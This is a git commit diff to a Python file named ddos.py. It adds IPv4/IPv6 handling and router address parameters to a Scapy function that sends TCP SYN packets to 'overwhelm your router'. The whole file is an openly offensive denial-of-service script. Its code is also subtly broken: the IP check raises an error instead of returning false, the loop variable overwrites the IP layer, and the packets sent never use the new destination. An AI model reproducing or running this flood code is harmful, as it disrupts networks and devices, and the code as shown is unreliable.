b10937cf31c287a5a72b41588126b293af7cc8f1
KarthikB-dev <saberlight35@gmail.com>
2021-07-22 09:09:39 -0700

    Add checking of IP version

--- ddos.py
+++ ddos.py
@@ -1,11 +1,21 @@
 from scapy.all import *
+import argparse
 
 # Generates packets to overwhelm your router
-def spam_router():
+def is_ipv6(address):
+    return address.index(":") != -1
+
+
+def spam_router(router_mac, router_ip):
     # router_mac =
     # TODO use ARP and grep to get the router's address
     e = Ether(router_mac)
     t = TCP(flags="S")
+    if is_ipv6(router_ip):
+        i = IPv6()
+    else:
+        i = IP()
+    i.dst = router_ip
     for i in range(10):
         send(e / IP() / t)
 
